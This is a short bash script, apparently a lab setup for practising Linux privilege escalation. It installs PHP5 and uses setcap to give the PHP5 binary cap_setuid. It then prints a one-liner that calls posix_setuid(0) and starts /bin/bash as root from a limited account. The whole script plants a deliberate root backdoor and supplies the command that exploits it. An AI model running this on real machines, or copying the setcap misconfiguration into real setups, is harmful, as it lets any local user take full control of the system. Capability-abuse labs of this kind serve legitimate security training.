#!/bin/bash

#Capabilities Setup
echo "[+] apt update & Install PHP5..."
sudo apt update -qq > /dev/null && sudo apt install php5 -y -qq > /dev/null
echo "[+] set cap_setuid to PHP5 binary..."
sudo setcap cap_setuid+ep /usr/bin/php5

echo -e "TYPE to get ROOT :"
echo -e "---------------------------------------------------------------------------"
echo -e "CMD=\"/bin/bash\" && /usr/bin/php5 -r \"posix_setuid(0); system('\$CMD');"\"
echo -e "---------------------------------------------------------------------------"
echo "[!] Login to limited user and go to /tmp"